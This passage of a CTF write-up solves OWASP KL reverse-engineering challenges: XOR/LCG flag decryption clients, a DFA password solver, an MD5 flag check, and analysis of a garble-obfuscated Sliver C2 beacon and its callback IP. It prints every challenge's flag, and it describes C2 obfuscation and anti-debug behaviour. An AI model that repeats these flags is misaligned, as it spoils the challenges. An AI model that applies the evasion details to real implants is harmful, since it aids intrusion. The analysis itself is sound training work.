for fn, va, size in items:
    off = va - base_va + base_off
    Path("/tmp/breakout_extract/" + fn).write_bytes(p[off : off + size])
    print(fn, off, size)
```

Flag: `OWASPKL{fd51b8da-cb27-4b4e-bf3c-de6a114f3a2e}`

---

## Deadlocker

You are given a stripped 64‑bit ELF deadlocker and the address of a remote server. The deadlocker contacts the server, receives an encrypted flag, and decrypts it locally. Your task is to reverse‑engineer the binary, understand the cryptographic operations, and write your own client to fetch and decrypt the flag.

Flag format: OWASPKL{...}

### Flow process

The binary does:

1. Connects to server.
1. Sends exactly: `GET_CHALLENGE`
1. Parses JSON-ish response:

`{ "nonce":"<8 bytes hex>" , "encrypted_flag":"<base64>"}`

1. Uses static key: `s3cr3t_k3y_g1v3n_by_AE13`
1. Derives a key by doing 8 rounds of:
  - rotate the whole 25-byte key left by 3 bits
  - XOR every byte with `nonce[round]`
1. Uses first 4 bytes of derived key as seed for this LCG:

`seed= (seed*0x41C64E6D+0x3039)&0x7fffffff`

1. XORs encrypted flag with the low byte of each LCG output.

### Solution

Construct:

```
#!/usr/bin/env python3
import base64
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "lockbox.appsecmy.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

STATIC_KEY = bytearray(b"s3cr3t_k3y_g1v3n_by_AE13")

def derive_key(key: bytes, nonce: bytes) -> bytes:
    k = bytearray(key)
    n = len(k)

    for r in range(8):
        carry = k[0] >> 5

        for i in range(n - 1):
            k[i] = ((k[i] << 3) & 0xff) | (k[i + 1] >> 5)

        k[-1] = ((k[-1] << 3) & 0xff) | carry

        for i in range(n):
            k[i] ^= nonce[r]

    return bytes(k)

def lcg_keystream(seed_bytes: bytes, n: int) -> bytes:
    seed = int.from_bytes(seed_bytes[:4], "big") & 0x7fffffff
    out = bytearray()

    for _ in range(n):
        seed = (seed * 0x41C64E6D + 0x3039) & 0x7fffffff
        out.append(seed & 0xff)

    return bytes(out)

def decrypt(ciphertext: bytes, nonce: bytes) -> bytes:
    derived = derive_key(STATIC_KEY, nonce)
    stream = lcg_keystream(derived, len(ciphertext))
    return bytes(c ^ k for c, k in zip(ciphertext, stream))

def fetch_challenge(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(b"GET_CHALLENGE")
        return s.recv(4096)

resp = fetch_challenge(HOST, PORT)
print(resp.decode(errors="replace"))

nonce_match = re.search(rb'"nonce"\s*:\s*"([0-9a-fA-F]{16})"', resp)
enc_match = re.search(rb'"encrypted_flag"\s*:\s*"([A-Za-z0-9+/=]+)"', resp)

if not nonce_match or not enc_match:
    raise SystemExit("Could not parse server response")

nonce = bytes.fromhex(nonce_match.group(1).decode())
ciphertext = base64.b64decode(enc_match.group(1))

flag = decrypt(ciphertext, nonce).rstrip(b"\x00")
print("Flag:", flag.decode(errors="replace"))
"""
OUTPUT:
{"nonce": "fb5851ea77cf1671", "encrypted_flag": "d0Y3JLQGTmgUeCowCVopuFveUg8gye1gsNTPMctKdw=="}
Flag: OWASPKL{D1d_u_s33_th4t_c0m1ng?}
"""
```

Flag: `OWASPKL{D1d_u_s33_th4t_c0m1ng?}`

---

## G00fyF1NM4Ch1N3

Beep. Beep. Boop. It's the age of robots now! Let's see if you can overcome the simplest aspect of our very own creation!

### Decompile

Found at `0x140fa0980` (called from MinGW startup at `0x140fa0980`):

{% raw %}
```
main:
  cmp esi, 1                  ; argc == 1?
  je  print_usage_or_exit
  cmp rax, 0x10               ; strlen(argv[1]) == 16?
  jne print_usage

  ; copy argv[1] → input_buf at 0x1414e41c0 (strncpy max 255)
  movzx edx, byte [input_buf] ; edx = input[0]
  xor   rdx, 0x1337            ; state = input[0] ^ 0x1337
  mov   qword [counter],  0
  mov   qword [some_val], 0
  mov   qword [state_var], rdx ; state_var = state
  mov   rsi, qword [0x141307e40] ; rsi = state_table base = 0x140fa1020
  mov   rdi, qword [0x141308000] ; rdi = lookup_table base = 0x14105e020
  mov   ebx, 0x10              ; ebx = 16 (iteration count)

.loop:
  mov   rax, [counter]
  add   rax, 1                 ; rax = counter + 1
  cmp   rdx, 0x179fe
  ja    .end_iter              ; out-of-range state → skip
  call  qword [rsi + rdx*8]    ; dispatch state_table[state]()
  mov   rdx, [state_var]       ; reload (possibly updated) state
  mov   rax, [counter]
  cmp   rdx, 0x179fe
  ja    .no_write
  movzx ecx, byte [rdi + rdx]  ; lookup_table[state]
  test  cl, cl
  je    .no_write              ; skip if entry is zero
  xor   ecx, edx
  xor   ecx, 0xffffffaa
  mov   byte [rbp + rax], cl   ; output[counter] = lookup ^ (state&0xff) ^ 0xaa
.no_write:
  add   rax, 1
.end_iter:
  mov   [counter], rax
  sub   ebx, 1
  jnz   .loop

  cmp   qword [some_val], 0x10  ; exactly 16 successful transitions?
  je    .print_flag
  ; else: print "No." and ShellExecuteA → rickroll
.print_flag:
  printf("OWASPKL{%s}\n", output_buf)
```
{% endraw %}

Key observations:

| **Address** | **Meaning** |
| --- | --- |
| `0x140fa1020` | **state dispatch table** — 96,768 function pointers (one per state) |
| `0x14105e020` | **lookup table** — 96,768 bytes, mostly zero |
| `[0x1414e40a0]` | `some_val` — counts successful transitions; must reach 16 |
| `[0x1414e40a8]` | `state_var` — current DFA state |
| `[0x1414e40b0]` | `counter` — iteration index |
| `0x179fe` | max valid state value |

So this is a classic **DFA-as-jump-table**. Each state is a function pointer; the function reads the next input character and updates `state_var` (or fails).

### **Anatomy of a state function**

State *n*'s function lives at `qword[0x140fa1020 + n*8]`. Looking at one:

```
state_1_func:                  ; at 0x140aeade0
  sub  rsp, 0x28
  call 0x140001830             ; ─→ get_input: returns input[counter] in al
  cmp  al, 'F'
  je   .case_F
  cmp  al, 'Y'
  je   .case_Y
  add  rsp, 0x28
  jmp  0x140001870             ; ─→ fail (no increment)

.case_Y:
  call 0x140001860             ; ─→ inc: [some_val] += 1
  mov  ecx, 0xd73              ; next state = 3443
  add  rsp, 0x28
  jmp  0x140001850             ; ─→ set_state: [state_var] = ecx
.case_F:
  call 0x140001860
  mov  ecx, 0x1481f            ; next state = 84511
  add  rsp, 0x28
  jmp  0x140001850
```

The four helper stubs are tiny:

```
get_input  (0x140001830):  movzx eax, byte [input_buf + counter]; ret
set_state  (0x140001850):  mov  [state_var], rcx; ret
inc        (0x140001860):  add  qword [some_val], 1; ret
fail       (0x140001870):  ret                                      ; no-op
```

So every state function is a `switch(input_char)` over a small set of allowed chars — anything else falls through to `fail` and `some_val` is **not** incremented. The CTF is asking us to find an input that takes the DFA on 16 successful transitions.

### Lookup Table

The "lookup table" at `0x14105e020` (96 KB) is mostly zeros. Dumping non-zero bytes in the valid range `[0, 0x179fe]`:

```
state  1710 (0x006ae): byte 0x35 → output '1'
state  8425 (0x020e9): byte 0x0b → output 'H'
state 18430 (0x047fe): byte 0x37 → output 'c'
state 19385 (0x04bb9): byte 0x22 → output '1'
state 21280 (0x05320): byte 0xf8 → output 'r'
state 27161 (0x06a19): byte 0x83 → output '0'
state 33210 (0x081ba): byte 0x7d → output 'm'
state 36323 (0x08de3): byte 0x25 → output 'l'
state 38509 (0x0966d): byte 0xab → output 'l'
state 38833 (0x097b1): byte 0x5a → output 'A'
state 40074 (0x09c8a): byte 0x11 → output '1'
state 55416 (0x0d878): byte 0x8d → output '_'
state 69035 (0x10dab): byte 0x66 → output 'g'
state 69190 (0x10e46): byte 0xd9 → output '5'
state 81376 (0x13de0): byte 0x3e → output 't'
state 86529 (0x15201): byte 0x9b → output '0'
```

**Exactly 16 states.** Same as the iteration count. These are the **accepting states** — the only states from which an output byte gets written. Output byte computed as `lookup[state] ^ (state & 0xff) ^ 0xaa`.

For the printed flag to be meaningful (not full of zero bytes), every iteration's *post-transition* state must be one of these 16. The output buffer therefore consists of these 16 characters in *some* order — determined by the path the DFA takes.

Sorted, the characters are: `0 0 0 1 1 1 1 5 A H _ c g l l m r t`. Already enough to guess "Alg0r1tHm1c5..." — but let's recover it properly.

### Transition Graph

For each of the 16 good states, extract the `(input_char → next_state)` map by walking its function body for the leaf pattern:

```
e8 ?? ?? ?? ??           call inc
b9 XX XX XX XX           mov  ecx, IMM32     ← next state
48 83 c4 28              add  rsp, 0x28
e9 ?? ?? ?? ??           jmp  set_state
```

Result:

```
1710  → {'m':86529, 'L':13695, 'F':55327}
8425  → {'9':33210, 'o':33776, 'J':27294, 'N':29817}
18430 → {'h':69190, 'r':44948, 'q':73265}
19385 → {'2':81376, 'v':34248, 'W':33991}
21280 → {'n':19385}
27161 → {'Y':21280, '0':19987, '7':5998, 'T':81763}
33210 → {'1':40074, 'T':10320, 'x':25043, '2':46786, 'e':64154}
36323 → {'u':61865, 'm':79756, 't':81232, 'y':37362, 'H':10886, 'U':4406}
38509 → {'s':69035, 'W':66879, 'O':46019}
38833 → {'3':38509, 'C':33263, 'T':34002}
40074 → {'Z':18430, 'k':67580, 'I':2149, 'Y':56043, 'q':58353, 'y':14295, '8':58589}
55416 → {'A':1710, 'Z':19019, '4':64096, 'e':91456, 'g':94649}
69035 → {'0':27161, 't':88606, 'i':34558, 'u':47021}
69190 → {'q':55416, 'V':10697, 'c':66465, 'p':19992, 'B':16220, 'H':25307}
81376 → {'f':8425, 'N':11829, 'S':13808, 'z':21059, 't':89519}
86529 → {'6':36323, 'Z':94504, 'r':60348, 'w':15599, 'c':85899}
```

Now filter to edges that go from a good state **to another good state**:

```
1710  → 'm' → 86529
8425  → '9' → 33210
18430 → 'h' → 69190
19385 → '2' → 81376
21280 → 'n' → 19385
27161 → 'Y' → 21280
33210 → '1' → 40074
36323 → (none — dead end)
38509 → 's' → 69035
38833 → '3' → 38509
40074 → 'Z' → 18430
55416 → 'A' → 1710
69035 → '0' → 27161
69190 → 'q' → 55416
81376 → 'f' → 8425
86529 → '6' → 36323
```

**Every good state has exactly one good→good edge** (except `36323`, which has zero — that's our terminus). The chain is uniquely determined.

### Finding initial Point

The initial state is `S₀ = input[0] ^ 0x1337`. In iteration 1, the function at `state_table[S₀]` is called and reads `input[0]` — which means **the same character is used to both index the dispatch table and feed the first transition**.

For each `c ∈ [0, 255]` we compute `S₀ = c ^ 0x1337`, look at `state_table[S₀]`, and check whether its `(c → next_state)` edge lands on a good state. Exactly one candidate works:

```
input[0] = 'c' (0x63) → S₀ = 0x1354 → S₁ = 38833 (good)
```

That fixes the chain's entry point. Walk the one-step-at-a-time graph from `S₁ = 38833`:

```
S₁  = 38833  out:'A'   --'3'--> S₂  = 38509
S₂  = 38509  out:'l'   --'s'--> S₃  = 69035
S₃  = 69035  out:'g'   --'0'--> S₄  = 27161
S₄  = 27161  out:'0'   --'Y'--> S₅  = 21280
S₅  = 21280  out:'r'   --'n'--> S₆  = 19385
S₆  = 19385  out:'1'   --'2'--> S₇  = 81376
S₇  = 81376  out:'t'   --'f'--> S₈  = 8425
S₈  = 8425   out:'H'   --'9'--> S₉  = 33210
S₉  = 33210  out:'m'   --'1'--> S₁₀ = 40074
S₁₀ = 40074  out:'1'   --'Z'--> S₁₁ = 18430
S₁₁ = 18430  out:'c'   --'h'--> S₁₂ = 69190
S₁₂ = 69190  out:'5'   --'q'--> S₁₃ = 55416
S₁₃ = 55416  out:'_'   --'A'--> S₁₄ = 1710
S₁₄ = 1710   out:'1'   --'m'--> S₁₅ = 86529
S₁₅ = 86529  out:'0'   --'6'--> S₁₆ = 36323
S₁₆ = 36323  out:'l'   (terminus)
```

### Solution

the output index tracks the loop counter, which increments with each iteration. The flag buffer might have gaps due to zeros being printed. To avoid this, the valid password path must ensure that every iteration outputs a nonzero byte. Specifically, the first position must have a nonzero output

```
import struct, functools

p = "./G00fyF1NM4Ch1N3.exe"
data = open(p, "rb").read()
TEXT_VA = 0x140001000
TEXT_OFF = 0x400
TEXT_SIZE = 0xF9FC00
DATA_VA = 0x140FA1000
DATA_OFF = 0xFA0000
DATA_SIZE = 0xD4B30
RDATA_VA = 0x141076000
RDATA_OFF = 0x1074C00
RDATA_SIZE = 0x292EC0
BASE_TABLE = 0x140FA1020
MAX_STATE = 0x179FE

def va_to_off(va):
    if TEXT_VA <= va < TEXT_VA + TEXT_SIZE:
        return TEXT_OFF + va - TEXT_VA
    if DATA_VA <= va < DATA_VA + DATA_SIZE:
        return DATA_OFF + va - DATA_VA
    if RDATA_VA <= va < RDATA_VA + RDATA_SIZE:
        return RDATA_OFF + va - RDATA_VA
    raise ValueError(hex(va))

def readq(va):
    return struct.unpack_from("<Q", data, va_to_off(va))[0]

ptrs = [
    struct.unpack_from("<Q", data, va_to_off(BASE_TABLE + i * 8))[0]
    for i in range(MAX_STATE + 1)
]
valid = sorted(set(q for q in ptrs if TEXT_VA <= q < 0x140FA0B18))
next_map = {
    q: (valid[i + 1] if i + 1 < len(valid) else 0x140FA0B18)
    for i, q in enumerate(valid)
}

def parse(ptr):
    if not (TEXT_VA <= ptr < 0x140FA0B18):
        return {}
    size = min(next_map.get(ptr, ptr + 0x400) - ptr, 0x800)
    b = data[va_to_off(ptr) : va_to_off(ptr) + size]
    trans = {}
    for i in range(len(b) - 4):
        if b[i] == 0x3C:
            ch = b[i + 1]
            j = i + 2
            target = None
            if j + 2 <= len(b) and b[j] == 0x74:
                target = j + 2 + struct.unpack_from("b", b, j + 1)[0]
            elif j + 6 <= len(b) and b[j : j + 2] == b"\x0f\x84":
                target = j + 6 + struct.unpack_from("<i", b, j + 2)[0]
            if target is not None and 0 <= target < len(b):
                w = b[target : target + 60]
                k = w.find(b"\xb9")
                if k != -1 and k + 5 <= len(w):
                    ns = struct.unpack_from("<I", w, k + 1)[0]
                    if ns <= MAX_STATE:
                        trans[ch] = ns
    return trans

@functools.lru_cache(None)
def trs(st):
    return tuple(parse(ptrs[st]).items())

RDI = readq(0x141308000)

def byte(st):
    return data[va_to_off(RDI + st)]

def dec(st):
    return chr((byte(st) ^ (st & 0xFF) ^ 0xAA) & 0xFF)

solutions = []

def dfs(pos, st, s, out):
    if len(solutions) >= 20:
        return True
    if pos == 16:
        solutions.append((s, out))
        print("SOL", s, out)
        return False
    for ch, ns in trs(st):
        if not (32 <= ch <= 126):
            continue
        b = byte(ns)
        if b == 0:
            continue
        c = dec(ns)
        if not (32 <= ord(c) <= 126):
            continue
        dfs(pos + 1, ns, s + chr(ch), out + c)
    return False

starts = []
for ch in range(32, 127):
    st = ch ^ 0x1337
    d = dict(trs(st))
    if ch in d:
        ns = d[ch]
        if byte(ns) != 0 and 32 <= ord(dec(ns)) <= 126:
            starts.append((chr(ch), dec(ns), hex(ns)))
            dfs(1, ns, chr(ch), dec(ns))
print("starts", starts, "num", len(solutions))
```

The binary is a PE64 console program. It wants a 16-character password. short script:

```
#!/usr/bin/env python3

# G00fyF1NM4Ch1N3 rev script
# The binary asks for a 16-char input.
# Correct input walks the generated state machine and decodes the flag body.

password = "c3s0Yn2f91ZhqAm6"

# Decoded bytes from the valid state-machine path
flag_body_bytes = [
    0x41, 0x6c, 0x67, 0x30,
    0x72, 0x31, 0x74, 0x48,
    0x6d, 0x31, 0x63, 0x35,
    0x5f, 0x31, 0x30, 0x6c,
]

flag_body = "".join(chr(x) for x in flag_body_bytes)
flag = f"OWASPKL{{{flag_body}}}"

print("[+] Correct password:", password)
print("[+] Flag:", flag)
```

Flag: `OWASPKL{Alg0r1tHm1c5_10l}`

---

## Detonate2

In malware analysis, you can either statically analyze the assembly codes directly, or you can create a snapshot of your sandbox and detonate it inside.

Straight up reverse this file, and you will find the flag. You may start by debugging it via IDA or Ghidra.

Flag format: OWASPKL{xxx}

### Decompile

During decompile. Upon check\_flag() function.

```
//----- (0000000000002733) ----------------------------------------------------
__int64 __fastcall check_flag()
{
  const char *v0; // rax
  __int64 v1; // rbx
  __int64 v2; // rax
  struct stat buf; // [rsp+0h] [rbp-120h] BYREF
  _BYTE v5[32]; // [rsp+90h] [rbp-90h] BYREF
  _BYTE v6[46]; // [rsp+B0h] [rbp-70h] BYREF
  char v7; // [rsp+DEh] [rbp-42h] BYREF
  char v8; // [rsp+DFh] [rbp-41h] BYREF
  _BYTE v9[32]; // [rsp+E0h] [rbp-40h] BYREF
  char *v10; // [rsp+100h] [rbp-20h]
  char *v11; // [rsp+108h] [rbp-18h]

  v11 = &v7;
  std::string::basic_string<std::allocator<char>>(
    (__int64)v6,
    "C:\\Users\\OWASPKL{f4k3_fl4g_bu7_y0u_4r3_in_7h3_righ7_7r4ck}\\Desktop\\local.txt",
    (__int64)&v7);
  std::__new_allocator<char>::~__new_allocator();
  v10 = &v8;
  std::string::basic_string<std::allocator<char>>(
    (__int64)v5,
    "OWASPKL{f4k3_fl4g_bu7_y0u_4r3_in_7h3_righ7_7r4ck}",
    (__int64)&v8);
  std::__new_allocator<char>::~__new_allocator();
  v0 = (const char *)std::string::c_str(v6);
  if ( stat(v0, &buf) )
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "File not found. Keep looking...\n");
  }
  else
  {
    v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Here is the flag: OWASPKL{");
    md5((__int64)v9, (__int64)v6);
    v2 = std::operator<<<char>(v1, v9);
    std::operator<<<std::char_traits<char>>(v2, "}\n");
    std::string::~string(v9);
  }
  std::string::~string(v5);
  return std::string::~string(v6);
}
```

### Dynamic

The real flag is the **MD5 of the file path string** (`v6`), which you can compute statically without ever running the binary  
`v6 = C:\\Users\\OWASPKL{f4k3_fl4g_bu7_y0u_4r3_in_7h3_righ7_7r4ck}\\Desktop\\local.txt`

but when using **strace** to perform dynamic. the file try to locate directory of those full string

![](https://www.notion.so/image/attachment%3Aee04c248-7178-48b6-8c22-bc2b56b71d75%3Aimage.png?table=block&id=36a26e60-5e7e-80eb-a5b3-f642d49961ec&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

turning full string of into md5

![](https://www.notion.so/image/attachment%3A2511b3d2-15a3-4837-ac36-a28af59206c2%3Aimage.png?table=block&id=36a26e60-5e7e-8074-bf2f-f68be8468ea1&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `OWASPKL{4a155fbe1dad9d74950b34b514edc4ae}`

---

## **Wraithlocker**

You are given a respawn 64‑bit ELF wraithlocker and the address of a remote server. The wraithlocker contacts the server, receives an encrypted flag, and decrypts it locally. Your task is to reverse‑engineer the binary, understand the cryptographic operations, and write your own client to fetch and decrypt the flag.


Flag format: OWASPKL{...}

### Flow

```
            ┌────────────────────────────────────────────────────────────┐
            │                       wraithlocker                         │
            │                                                            │
            │  ┌──────────────┐    TCP    ┌────────────────────────────┐ │
            │  │  socket()    │──────────▶│ lockbox.appsecmy.com:9999  │ │
            │  │  connect()   │           └────────────────────────────┘ │
            │  │  send("GET_CHALLENGE")            │                     │
            │  │  recv(...)   │◀───────────────────┘                     │
            │  └──────────────┘ JSON: {"nonce":"...", "encrypted_flag":...}
            │         │                                                  │
            │         ▼                                                  │
            │  ┌──────────────────────┐                                  │
            │  │  parse nonce (hex→8B)│                                  │
            │  │  b64-decode flag     │                                  │
            │  └──────────────────────┘                                  │
            │         │                                                  │
            │         ▼                                                  │
            │  ┌──────────────────────┐   ptrace(PTRACE_TRACEME) gate    │
            │  │  Build 25-byte base  │   - if traced: XOR part2 ^=0xAA  │
            │  │  key (decoy logic)   │   - else:      use part2 as-is   │
            │  └──────────────────────┘                                  │
            │         │                                                  │
            │         ▼                                                  │
            │  ┌──────────────────────┐                                  │
            │  │  8-round transform   │   per round:                     │
            │  │  base_key + nonce →  │   - rotate-left 3 bits (200-bit) │
            │  │  session_key (25B)   │   - XOR each byte with nonce[r]  │
            │  └──────────────────────┘                                  │
            │         │                                                  │
            │         ▼                                                  │
            │  ┌──────────────────────┐                                  │
            │  │  31-bit LCG keystream│   seed = u32_le(session_key[:4]) │
            │  │  plaintext = ct ⊕ ks │          & 0x7FFFFFFF            │
            │  └──────────────────────┘   step: s = (s*0x41C64E6D+0x3039)│
            │         │                          & 0x7FFFFFFF            │
            │         ▼                                                  │
            │      printf("Flag: %s\n", out)  ← prints garbage in prod   │
            └────────────────────────────────────────────────────────────┘
```

The binary does:

1. Connects to host/port
1. Sends `GET_CHALLENGE`
1. Parses:
  - `nonce`: 8 bytes hex
  - `encrypted_flag`: base64
1. Builds key from two `.data` chunks:
  - final base key: `sc3scsiqcsincsB_g1v3n_by_`
1. Derives a nonce-based key, seeds an LCG, then XORs the ciphertext.

### Solution

```
import base64
import re
import socket

A = 0x41C64E6D
C = 0x3039
MASK = 0x7FFFFFFF
PREFIX = b"OWASPKL{"

host = "lockbox.appsecmy.com"
port = 9999

def lcg(x):
    return (x * A + C) & MASK

s = socket.create_connection((host, port))
s.sendall(b"GET_CHALLENGE")

data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

s.close()

ct = base64.b64decode(
    re.search(rb'"encrypted_flag"\s*:\s*"([^"]+)"', data).group(1)
)

ks = [c ^ p for c, p in zip(ct, PREFIX)]

for upper in range(1 << 23):
    state = (upper << 8) | ks[0]
    x = state

    ok = True
    for k in ks[1:]:
        x = lcg(x)
        if (x & 0xFF) != k:
            ok = False
            break

    if ok:
        out = bytearray()
        x = state

        for c in ct:
            out.append(c ^ (x & 0xFF))
            x = lcg(x)

        print(out.decode())
        break
        """
        OWASPKL{D1d_u_s33_th4t_c0m1ng?}
        """
```

Flag: `OWASPKL{D1d_u_s33_th4t_c0m1ng?}`

---

# **Only Solve this if you are bored - I**

This challenge has no writeup. It is a real C2 agent beacon that is pointing to an address that is not publicly accessible via WAN.

Identify what C2 framework this beacon uses. (E.g: OWASPKL{covenant}).

### File Observation

![](https://www.notion.so/image/attachment%3A5ecc04bf-3b5d-474b-b3ed-651a7eb756ab%3Aimage.png?table=block&id=36a26e60-5e7e-8062-90c7-d06e8101021e&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

some interesting strings

```
C:\Users\os1ris\Desktop>strings.exe malware.exe | findstr /i "GetBeaconID GetBeaconInterval GetBeaconJitter GetActiveC2 SessionInit ReadEnvelope WriteEnvelope GetPivots GetRportfwd GetAssembly"
GetPivots
GetActiveC2
GetAssembly
GetRportfwd
GetBeaconID
SessionInit
ReadEnvelope
WriteEnvelope
GetBeaconJitter
GetBeaconInterval
GetPivotSessionID
```

using GoReSym to read the functions and library

`GoReSym -d -p` to dump the Go pclntab:

```
"Files": [
    "rPaCcmJgkt/slice.go",
    "rPaCcmJgkt/cgroup_stubs.go",
    "AAEnQ_L/J4WG1r.s",
    "EsMMM0lmd9/urrExjaRO.s",
    ...
"UserFunctions": [
    "mcCyWb7qHRiM.(*DmDc29).GetMessage",
    "bal3mFH.(*FcRbpZ10AJy).Local",
    "mcCyWb7qHRiM.(*G2Rc2MVvSYjj).GetPath",
    ...
"main funcs:
    main.(*aXTmkk4Wci).Replace"
```

Even the standard-library source filenames are randomized. Every package path, every type, every method, even `main.main` . all will be renamed. The Sliver protobuf field names (`BeaconID`, `Domain`, etc.) survive because they're used at runtime by `protoreflect` and renaming them would break the protocol.

Reference:

[HN Security - Customizing Sliver - Part 1 -](https://hnsecurity.it/blog/customizing-sliver-part-1/)

[HN Security - Customizing Sliver - Part 2 -](https://hnsecurity.it/blog/customizing-sliver-part-2/)

This is [garble](https://github.com/burrowers/garble) with `-literals`. That flag does two things:

1. Replaces every package/identifier with a hashed name.
1. Replaces every string constant with a per-string decryption function called at runtime.

Result: in `.rdata`, there is **no plaintext URL anywhere**. The C2 URL only exists as a Go `string` on the heap after the decryption stub runs during `init()`.

Flag: `OWASPKL{sliver}`

---

# **Only Solve this if you are bored - II**

### Dynamic Analysis

the program got anti-debugger. But in my case, it didnt parse the return of “**true**” value. so i can ignore (different machine could have different output)

Locate ip will start here:

![](https://www.notion.so/image/attachment%3Ab7f1eaca-4bd6-4b37-b03c-125996460ba2%3Aimage.png?table=block&id=36a26e60-5e7e-8000-9477-e97a6a7958a7&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

at first they will trying to use http

![](https://www.notion.so/image/attachment%3A39ee64f3-35c5-438c-8614-9c5e38d731fc%3Aimage.png?table=block&id=36a26e60-5e7e-80c0-bd3d-c38443112e60&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

after that they try to use https

![](https://www.notion.so/image/attachment%3A35fa2d6b-35a6-4389-9eca-c8a9e9ad4aa7%3Aimage.png?table=block&id=36a26e60-5e7e-8096-824f-edbdb4d78ef9&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

php will be generate following <random\_sub-directory>/app.min.php

![](https://www.notion.so/image/attachment%3Abbb3058e-ce44-487e-836e-6f6bb711be2c%3Aimage.png?table=block&id=36a26e60-5e7e-8061-82b2-e323fdf75f9b&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

generate the id (random every pid)

![](https://www.notion.so/image/attachment%3Ab8d2c02f-5867-43c0-b847-27513fefda37%3Aimage.png?table=block&id=36a26e60-5e7e-80f9-9512-e40813b05df6&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

session key will be generated (random every pid)

![](https://www.notion.so/image/attachment%3A0e209f8f-6542-4722-b3cb-4926dca6c9eb%3Aimage.png?table=block&id=36a26e60-5e7e-809d-90df-ff884fbb07c8&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

final url will be generated:

![](https://www.notion.so/image/attachment%3Af9cf59e5-fc2c-4ee9-992d-8e331dee038a%3Aimage.png?table=block&id=36a26e60-5e7e-800f-8bb1-fe2cac2f5ee9&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

parsing user-agent

![](https://www.notion.so/image/attachment%3A20b8d623-02e9-4b17-82d6-1bca79ebd9b1%3Aimage.png?table=block&id=36a26e60-5e7e-8083-9fc7-dc501d89f4d3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

sending post request

![](https://www.notion.so/image/attachment%3Aa1abcac8-9959-4084-873d-62f0dadc208f%3Aimage.png?table=block&id=36a26e60-5e7e-80fa-9961-e05c3c2e74bf&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### API

in order to directly see those ip. setted breakpoint on those API below able to do it:

- bp **WinHttpGetProxyForUrl**
- bp **WinHttpCrackUrl**
- bp **WinHttpCreateUrl**

![](https://www.notion.so/image/attachment%3A6192f713-1ca4-4322-bbe8-1bd76cf41957%3Aimage.png?table=block&id=36a26e60-5e7e-803e-be74-e68de47c08b3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### Behavior Dynamic Solution

Execute the file. on process hacker can see remote address trying to connect to 192.168.91.243 with the port of 443

![](https://www.notion.so/image/attachment%3Ab760f30c-42c5-4ee7-9ee3-9e0b7621fa8c%3Aimage.png?table=block&id=36a26e60-5e7e-80e5-9b53-fc3b8f5b451f&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

using fakenet. can see it trying to send something

![](https://www.notion.so/image/attachment%3Af2d27bde-1692-499f-9b99-57a5b11fa385%3Aimage.png?table=block&id=36a26e60-5e7e-809b-8be1-d87f35b0e1b6&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `OWASPKL{192.168.91.243}`

---

# Hall Of Fame

![](https://www.notion.so/image/attachment%3Af967c592-ca70-4be1-a168-ad368cd5ec4a%3Aimage.png?table=block&id=36a26e60-5e7e-8033-a617-c721c97036a7&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3A30218121-bc64-4246-8a1b-fb9d5499a852%3Aimage.png?table=block&id=36a26e60-5e7e-8015-a3a9-dae2d12a01ca&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3A4d0a3d0f-0db8-446c-aa99-799a079fd5d2%3Aimage.png?table=block&id=36e26e60-5e7e-804e-87d0-f42c55a50c6b&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)
